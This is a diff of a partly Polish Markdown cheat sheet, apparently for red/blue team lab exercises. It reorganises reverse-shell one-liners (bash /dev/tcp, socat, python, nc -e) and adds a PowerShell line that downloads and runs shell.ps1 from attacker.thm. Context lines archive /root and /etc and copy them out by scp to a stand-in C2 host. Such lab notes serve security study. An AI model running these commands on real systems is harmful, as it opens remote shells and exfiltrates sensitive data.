@@ -105,12 +105,6 @@ tar czf dump.tar.gz /root /etc/                       # Archiving sensitive data
 scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data
 ```
 # Red
-## Reverse shell
-```
-bash -i >& /dev/tcp/10.10.10.10/1337 0>&1
-socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane
-python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'
-```
 ## Notatki
 ### Jeśli masz ograniczony shell i nie możesz przesłać pliku, możesz go "wypluć" jako tekst i skopiować:
 ```
@@ -121,10 +115,17 @@ xxd -r -p data.hex > odzyskany_plik.zip
 ### Reverse Shell
 ```
 nc -e /bin/bash <attackbox_ip> <port>
+bash -i >& /dev/tcp/10.10.10.10/1337 0>&1
+socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane
+python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'
 ```
 ### Interaktywny shell
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+### Remote payload execution
+```
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.thm/shell.ps1')"
 ```
 # Blue
 ## Ausearch
